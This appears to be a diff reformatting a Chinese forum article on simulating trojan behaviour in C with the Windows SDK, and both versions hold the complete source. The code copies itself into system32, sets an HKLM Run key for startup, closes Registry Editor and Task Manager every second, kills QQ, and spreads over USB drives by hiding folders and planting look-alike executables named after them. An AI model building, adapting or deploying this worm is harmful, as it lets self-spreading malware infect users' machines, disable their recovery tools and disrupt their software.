@@ -1,269 +1,264 @@
 
-
 # C 语言 SDK 模拟木马行为
 
 > 原文：[`www.pediy.com/kssd/pediy12/142988.html`](https://www.pediy.com/kssd/pediy12/142988.html)
 
-1、程序运行后将自身复制到 C:\\\\WINDOWS\\\\system32\\\\文件夹下，程序名为 vrius.exe。  
-  
-2、在注册表 HKEY\_LOCAL\_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run 下写入键值，实现程序开机启动。  
-  
-3、程序定时器每秒启发一次，如果发现，注册表，任务管理器被打开，立即将其关闭。  
-（可以使用驱动级反病毒辅助软件。比如冰刃，狙剑结束此程序进程，因为程序运行后就无法使用 Windows 任务管理器了）。  
-  
-4、程序每秒枚举一次进程，如发现 QQ 进程，立即将其结束（无论是已登录还是正在登陆）。  
-（想结束杀软进程的，我们的程序运行在 R3 级别，杀软运行在 R0 级别，难度还是比较大的。杀软如果能被轻易搞掉他就不叫杀软了。）  
-  
-  
-5、程序运行后检测是否有可移动设备插入（U 盘），U 盘插入，会有 WM\_DEVICECHANGE 消息产生。  
-如果发现有 U 盘插入，获取 U 盘盘符，列出 U 盘根目录下存在的文件夹，将这些文件夹的属性设置为系统加隐藏属性。此时 U 盘中的目录（文件夹）将全部不可见，拷贝 C:\\\\WINDOWS\\\\system32\\\\virus.exe 到 U 盘，程序名为 U 盘下文件夹的文件名加上.exe。比如你的 U 盘本来有一个  
-Virus 文件夹，现在我将其属性设为系统文件+隐藏。然后把 C:\\\\WINDOWS\\\\system32\\\\virus.exe 拷贝到 U 盘将其命名为 Virus.exe  
-一般用户的【隐藏已知文件名的扩展名】是打着勾的。如果我们将我们的程序的图标改成文件夹的图标。是不会发现异常的。  
-当用户打开 U 盘，单击“文件夹”时，就启发了我们的程序，程序运行，自我复制。。。。。。。  
-这样就实现了我们的“木马”，通过 U 盘等可移动设备传播。。  
-  
-  
-以下是代码：  
-  
-  
+1、程序运行后将自身复制到 `C:\\WINDOWS\\system32\\` 文件夹下，程序名为 `vrius.exe`。
 
-代码:
+2、在注册表 `HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` 下写入键值，实现程序开机启动。
 
-```
-#include "stdafx.h"
-#include <windows.h>
-#include <Dbt.h>
-#include <iostream>
+3、程序定时器每秒触发一次，如果发现注册表、任务管理器被打开，立即将其关闭。
+
+（可以使用驱动级反病毒辅助软件。比如冰刃，狙剑结束此程序进程，因为程序运行后就无法使用 Windows 任务管理器了）。
+
+4、程序每秒枚举一次进程，如发现 QQ 进程，立即将其结束（无论是已登录还是正在登陆）。
+
+（想结束杀软进程的，我们的程序运行在 `R3` 级别，杀软运行在 `R0` 级别，难度还是比较大的。杀软如果能被轻易搞掉他就不叫杀软了。）
+
+5、程序运行后检测是否有可移动设备插入（U 盘），U 盘插入，会有 `WM_DEVICECHANGE` 消息产生。
+
+如果发现有 U 盘插入，获取 U 盘盘符，列出 U 盘根目录下存在的文件夹，将这些文件夹的属性设置为系统加隐藏属性。此时 U 盘中的目录（文件夹）将全部不可见，拷贝 `C:\\WINDOWS\\system32\\virus.exe` 到 U 盘，程序名为 U 盘下文件夹的文件名加上 `.exe`。比如你的 U 盘本来有一个 `Virus` 文件夹，现在我将其属性设为系统文件+隐藏。然后把 `C:\\WINDOWS\\system32\\virus.exe` 拷贝到 U 盘将其命名为 `Virus.exe`。
+
+一般用户的【隐藏已知文件名的扩展名】是打着勾的。如果我们将我们的程序的图标改成文件夹的图标。是不会发现异常的。
+
+当用户打开 U 盘，单击“文件夹”时，就启发了我们的程序，程序运行，自我复制……
+
+这样就实现了我们的“木马”，通过 U 盘等可移动设备传播。
+
+以下是代码：
+
+```c
+#include "stdafx.h"
+#include <windows.h>
+#include <Dbt.h>
+#include <iostream>
 #include"io.h"
-#include "tlhelp32.h" 
-using namespace std;
-LRESULT CALLBACK WndProc(
-  HWND hwnd,      // handle to window
-  UINT uMsg,      // message identifier
-  WPARAM wParam,  // first message parameter
-  LPARAM lParam   // second message parameter
+#include "tlhelp32.h" 
+using namespace std;
+LRESULT CALLBACK WndProc(
+  HWND hwnd,      // handle to window
+  UINT uMsg,      // message identifier
+  WPARAM wParam,  // first message parameter
+  LPARAM lParam   // second message parameter
 );
 
-void KillProcess(HWND hwnd);
+void KillProcess(HWND hwnd);
 
-int APIENTRY WinMain(HINSTANCE hInstance,
-                     HINSTANCE hPrevInstance,
-                     LPSTR     lpCmdLine,
-                     int       nCmdShow)
+int APIENTRY WinMain(HINSTANCE hInstance,
+                    HINSTANCE hPrevInstance,
+                    LPSTR     lpCmdLine,
+                    int       nCmdShow)
 {
 
-    WNDCLASS wndclass;
-    wndclass.cbClsExtra=0;
-  wndclass.cbWndExtra=0;
-  wndclass.hbrBackground=(HBRUSH)GetStockObject(BLACK\_BRUSH);
-  wndclass.hCursor=LoadCursor(NULL,IDC\_ICON);
-  wndclass.hIcon=LoadIcon(NULL,IDI\_ASTERISK);
-  wndclass.hInstance=hInstance;
-  wndclass.lpfnWndProc=WndProc;
-  wndclass.lpszClassName="lieying";
-  wndclass.lpszMenuName=NULL;
-  wndclass.style=CS\_VREDRAW|CS\_HREDRAW;
+    WNDCLASS wndclass;
+    wndclass.cbClsExtra=0;
+  wndclass.cbWndExtra=0;
+  wndclass.hbrBackground=(HBRUSH)GetStockObject(BLACK_BRUSH);
+  wndclass.hCursor=LoadCursor(NULL,IDC_ICON);
+  wndclass.hIcon=LoadIcon(NULL,IDI_ASTERISK);
+  wndclass.hInstance=hInstance;
+  wndclass.lpfnWndProc=WndProc;
+  wndclass.lpszClassName="lieying";
+  wndclass.lpszMenuName=NULL;
+  wndclass.style=CS_VREDRAW|CS_HREDRAW;
 
-  RegisterClass(&wndclass);             //注册窗口类
+  RegisterClass(&wndclass);            //注册窗口类
 
-  HWND hwnd;
-  hwnd=CreateWindow("lieying","",WS\_OVERLAPPEDWINDOW,150,150,683,384,NULL,NULL,hInstance,NULL);
-  ShowWindow(hwnd,SW\_HIDE);       //隐藏窗体
-  UpdateWindow(hwnd);
-    MSG msg;
-  while(GetMessage(&msg,hwnd,0,0))      //消息循环
-  {
-    TranslateMessage(&msg);
-    DispatchMessage(&msg);
-  }
+  HWND hwnd;
+  hwnd=CreateWindow("lieying","",WS_OVERLAPPEDWINDOW,150,150,683,384,NULL,NULL,hInstance,NULL);
+  ShowWindow(hwnd,SW_HIDE);       //隐藏窗体
+  UpdateWindow(hwnd);
+    MSG msg;
+  while(GetMessage(&msg,hwnd,0,0))      //消息循环
+  {
+    TranslateMessage(&msg);
+    DispatchMessage(&msg);
+  }
 
-  return 0;
+  return 0;
 }
 
 
-LRESULT CALLBACK WndProc( HWND hwnd,   UINT uMsg,   WPARAM wParam,   LPARAM lParam  )   //窗口过程
+LRESULT CALLBACK WndProc( HWND hwnd,   UINT uMsg,   WPARAM wParam,   LPARAM lParam  )   //窗口过程
 
 {
-  switch(uMsg)
-  {
+  switch(uMsg)
+  {
 
-     case WM\_PAINT:
-       {
-           PAINTSTRUCT ps;
-             BeginPaint(hwnd,&ps);
-           EndPaint(hwnd,&ps);
-           break;
-       }
+     case WM_PAINT:
+       {
+           PAINTSTRUCT ps;
+             BeginPaint(hwnd,&ps);
+           EndPaint(hwnd,&ps);
+           break;
+       }
 
-     case WM\_CLOSE:
-       {
-         DestroyWindow(hwnd);
-           break;
-       }
+     case WM_CLOSE:
+       {
+         DestroyWindow(hwnd);
+           break;
+       }
 
-     case WM\_DESTROY:
-       {
-         PostQuitMessage(0);
-               break;
-       }
-     case WM\_CREATE:                                //窗体创建时执行复制自身到系统目录，并写注册表实现开机启动。
-       {
+     case WM_DESTROY:
+       {
+         PostQuitMessage(0);
+               break;
+       }
+     case WM_CREATE:                              //窗体创建时执行复制自身到系统目录，并写注册表实现开机启动。
+       {
 
-                SetTimer(hwnd,1,1000,NULL);           //设置定时器,每秒调用一次。
+                 SetTimer(hwnd,1,1000,NULL);             //设置定时器,每秒调用一次。
 
-        //复制文件自身到系统目录
-        TCHAR ExeFullPath\[MAX\_PATH\];
-        GetModuleFileName(NULL,ExeFullPath,MAX\_PATH);   //获取 exe 的全路径(包括文件名)
+        //复制文件自身到系统目录
+        TCHAR ExeFullPath[MAX_PATH];
+        GetModuleFileName(NULL,ExeFullPath,MAX_PATH);   //获取 exe 的全路径(包括文件名)
 
-          TCHAR NewFilePath\[MAX\_PATH\]="C:\\\\WINDOWS\\\\system32\\\\virus.exe";  //Copy 到系统目录。。。。
-        CopyFile(ExeFullPath,NewFilePath,TRUE);  
+          TCHAR NewFilePath[MAX_PATH]="C:\\WINDOWS\\system32\\virus.exe";  //Copy 到系统目录。。。。
+        CopyFile(ExeFullPath,NewFilePath,TRUE);   
 
+        
+        //写注册表，实现开机运行。
+        HKEY hkey;
+        TCHAR keyvalue[MAX_PATH]="C:\\WINDOWS\\system32\\virus.exe";   
+        TCHAR childkey[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
 
-        //写注册表，实现开机运行。
-        HKEY hkey;
-        TCHAR keyvalue\[MAX\_PATH\]="C:\\\\WINDOWS\\\\system32\\\\virus.exe";  
-        TCHAR childkey\[\]=TEXT("Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run");
+        RegOpenKeyEx(HKEY_LOCAL_MACHINE,childkey,0,KEY_CREATE_SUB_KEY,&hkey);
+        RegSetValue(HKEY_LOCAL_MACHINE,childkey,REG_SZ,keyvalue,strlen(keyvalue));
+        RegCloseKey(hkey);
 
-        RegOpenKeyEx(HKEY\_LOCAL\_MACHINE,childkey,0,KEY\_CREATE\_SUB\_KEY,&hkey);
-        RegSetValue(HKEY\_LOCAL\_MACHINE,childkey,REG\_SZ,keyvalue,strlen(keyvalue));
-        RegCloseKey(hkey);
-
-         break;
-       }
-
-
-    case WM\_DEVICECHANGE:          //移动存储设备插入电脑会产生 WM\_DEVICECHANGE 消息
-      {
-        if(lParam!=0)
-        {
-          PDEV\_BROADCAST\_HDR lpdb = (PDEV\_BROADCAST\_HDR)lParam;   //定义 PDEV\_BROADCAST\_HDR 结构体，系统填充结构体信息。
-          if(lpdb->dbch\_devicetype==DBT\_DEVTYP\_VOLUME)            
-          {
-            if(wParam==DBT\_DEVICEARRIVAL)                       //移动存储设备已经可用。
-            {
-                long i,j;
-              TCHAR buf\[100\];
-              TCHAR \*cdbuf;
-              j=100;
-              i=GetLogicalDriveStrings(j,buf);
-              for(j=0;j<i;j+=4)
-              {
-                cdbuf=&buf\[j\];
-                if(GetDriveType(cdbuf)==DRIVE\_REMOVABLE)   //判断插入设备的类型是否为可移动设备
-                {
-
-                  TCHAR FileName\[MAX\_PATH\];
-                  strcpy(FileName,cdbuf);
-                  TCHAR f\[MAX\_PATH\]=TEXT("\\\\\*.");
-                  strcat(FileName,f);
-                   struct \_finddata\_t files;
-                   int File\_Handle;
-                   int i=0;
-                   File\_Handle = \_findfirst(FileName,&files);              
-                   if(File\_Handle==-1)
-                   {
-                     break;
-                   }
-
-                   do
-                   {
-                    TCHAR temp\[MAX\_PATH\];
-                    strcpy(temp,strcat(cdbuf,"\\\\"));
-                                        strcat(cdbuf,files.name);
-                                        //目录正常显示 SetFileAttributes(cdbuf,FILE\_ATTRIBUTE\_ARCHIVE);
-                                        SetFileAttributes(cdbuf,FILE\_ATTRIBUTE\_HIDDEN+FILE\_ATTRIBUTE\_SYSTEM);  //给目录添加隐藏，系统属性。
-                    CopyFile("C:\\\\WINDOWS\\\\system32\\\\virus.exe",strcat(cdbuf,".exe"),FALSE); //将系统目录下的病毒文件，拷贝到 U 盘，名字为 U 盘子目录的名字加.exe。
-                     i++;
-                     strcpy(cdbuf,temp);
-                   }
-                  while(0==\_findnext(File\_Handle,&files));
-                   \_findclose(File\_Handle);
-                   //MessageBox(hwnd,"I have already finished my task......","Sucess",MB\_OK||MB\_ICONINFORMATION);
-                }
-              }
-
-            }
-          }
-        }
-
-      }
-      break;
+         break;
+       }
 
 
+    case WM_DEVICECHANGE:           //移动存储设备插入电脑会产生 WM_DEVICECHANGE 消息
+      {
+        if(lParam!=0)
+        {
+          PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;   //定义 PDEV_BROADCAST_HDR 结构体，系统填充结构体信息。
+          if(lpdb->dbch_devicetype==DBT_DEVTYPE_VOLUME)             
+          {
+            if(wParam==DBT_DEVICEARRIVAL)                      //移动存储设备已经可用。
+            {
+                long i,j;
+              TCHAR buf[100];
+              TCHAR *cdbuf;
+              j=100;
+              i=GetLogicalDriveStrings(j,buf);
+              for(j=0;j<i;j+=4)
+              {
+                cdbuf=&buf[j];
+                if(GetDriveType(cdbuf)==DRIVE_REMOVABLE)   //判断插入设备的类型是否为可移动设备
+                {
 
-    case WM\_TIMER:                                   //处理 WM\_TIMER 消息
-      {
-           HWND hwReg=FindWindow("RegEdit\_RegEdit","注册表编辑器");       //寻找注册表
-           if(hwReg!=NULL)
-           {
-             SendMessage(hwReg,WM\_CLOSE,NULL,NULL);                     //如果找到注册表，立即关闭
-           }
+                  TCHAR FileName[MAX_PATH];
+                  strcpy(FileName,cdbuf);
+                  TCHAR f[MAX_PATH]="\\*.";
+                  strcat(FileName,f);
+                   struct _finddata_t files;
+                   int File_Handle;
+                   int i=0;
+                   File_Handle = _findfirst(FileName,&files);             
+                   if(File_Handle==-1)
+                   {
+                     break;
+                   }
 
-           HWND hwTsk=FindWindow("#32770","Windows 任务管理器");          //寻找任务管理器
-           if(hwTsk!=NULL)
-           {
-                        SendMessage(hwTsk,WM\_CLOSE,NULL,NULL);                   //如果找到任务管理器，立即关闭
-           }
+                   do
+                   {
+                    TCHAR temp[MAX_PATH];
+                    strcpy(temp,strcat(cdbuf,"\\"));
+                                    strcat(cdbuf,files.name);
+                                    //目录正常显示 SetFileAttributes(cdbuf,FILE_ATTRIBUTE_ARCHIVE);
+                                    SetFileAttributes(cdbuf,FILE_ATTRIBUTE_HIDDEN+FILE_ATTRIBUTE_SYSTEM);  //给目录添加隐藏，系统属性。
+                    CopyFile("C:\\WINDOWS\\system32\\virus.exe",strcat(cdbuf,".exe"),FALSE); //将系统目录下的病毒文件，拷贝到 U 盘，名字为 U 盘子目录的名字加.exe。
+                     i++;
+                     strcpy(cdbuf,temp);
+                   }
+                  while(0==_findnext(File_Handle,&files));
+                   _findclose(File_Handle);
+                   //MessageBox(hwnd,"I have already finished my task......","Sucess",MB_OK||MB_ICONINFORMATION);
+                }
+              }
 
-           HWND hwQQ=FindWindow("TXGuiFoundation",NULL);             //查找 QQ
-           if(hwQQ!=NULL)
-           {
-                        KillProcess(hwnd);  //杀死 QQ 进程，无论已经登陆 QQ，还是正在登陆。。。。
-           }
-      }
-      break;
+            }
+          }
+        }
+
+      }
+      break;
 
 
 
-       default:
-       {
-          return DefWindowProc(hwnd,uMsg,wParam,lParam);
-          break;
-       }
-  }
+    case WM_TIMER:                                //处理 WM_TIMER 消息
+      {
+           HWND hwReg=FindWindow("RegEdit_RegEdit","注册表编辑器");       //寻找注册表
+           if(hwReg!=NULL)
+           {
+             SendMessage(hwReg,WM_CLOSE,NULL,NULL);                      //如果找到注册表，立即关闭
+           }
 
-  return 0;
+           HWND hwTsk=FindWindow("#32770","Windows 任务管理器");          //寻找任务管理器
+           if(hwTsk!=NULL)
+           {
+                        SendMessage(hwTsk,WM_CLOSE,NULL,NULL);             //如果找到任务管理器，立即关闭
+           }
+
+           HWND hwQQ=FindWindow("TXGuiFoundation",NULL);          //查找 QQ
+           if(hwQQ!=NULL)
+           {
+                        KillProcess(hwnd);  //杀死 QQ 进程，无论已经登陆 QQ，还是正在登陆。。。。
+           }
+      }
+      break;
+
+
+
+       default:
+       {
+         return DefWindowProc(hwnd,uMsg,wParam,lParam);
+         break;
+       }
+  }
+
+  return 0;
 }
 
 
 
 
-void KillProcess(HWND hwnd)  //关闭 QQ 进程
-{  
-     //   TODO:   Add   your   control   notification   handler   code   here  
-     //   PROCESSENTRY32 结构对象  
-       PROCESSENTRY32 pe;  
-    //   创建快照句柄
-       pe.dwSize = sizeof(PROCESSENTRY32);  
-     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS\_SNAPPROCESS, 0);
+void KillProcess(HWND hwnd)  //关闭 QQ 进程
+{   
+     //   TODO:   Add   your   control   notification   handler   code   here   
+     //   PROCESSENTRY32 结构对象   
+       PROCESSENTRY32 pe;   
+    //   创建快照句柄
+       pe.dwSize = sizeof(PROCESSENTRY32);   
+     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
-  
-      //   先搜索系统中第一个进程的信息  
-     Process32First(hSnapshot, &pe);  
-   
-     TCHAR szFile\[MAX\_PATH\];
-        int p;  
-
-
-     //   下面对系统中的所有进程进行枚举，  
-     do{  
-             lstrcpy(szFile, pe.szExeFile);
-             p = lstrcmp(szFile, "QQ.exe");
-             if(0 == p)   //if(strlen(pe.szExeFile)>0)判断关闭系统进程外的所以进程
-               {
-                   HANDLE h = OpenProcess(PROCESS\_ALL\_ACCESS, TRUE, pe.th32ProcessID);   
-                    
-
-                     //先取得他  
-                   if(h)   
-                           TerminateProcess(h, 0);  //关闭  
-                         //break;  
-             }   
-         }while(Process32Next(hSnapshot, &pe));
+   
+      //   先搜索系统中第一个进程的信息   
+     Process32First(hSnapshot, &pe);   
+    
+     TCHAR szFile[MAX_PATH];
+        int p;   
+      
+     //   下面对系统中的所有进程进行枚举，   
+     do{   
+         lstrcpy(szFile, pe.szExeFile);
+         p = lstrcmp(szFile, "QQ.exe");
+         if(0 == p)   //if(strlen(pe.szExeFile)>0)判断关闭系统进程外的所以进程
+           {
+             HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pe.th32ProcessID);    
+             
+             //先取得他   
+             if(h)    
+                 TerminateProcess(h, 0);  //关闭   
+               //break;   
+         }   
+     }while(Process32Next(hSnapshot, &pe));
 
 
-      //   关闭快照句柄  
-    CloseHandle(hSnapshot);    
+      //   关闭快照句柄   
+    CloseHandle(hSnapshot);     
 }
-
 ```
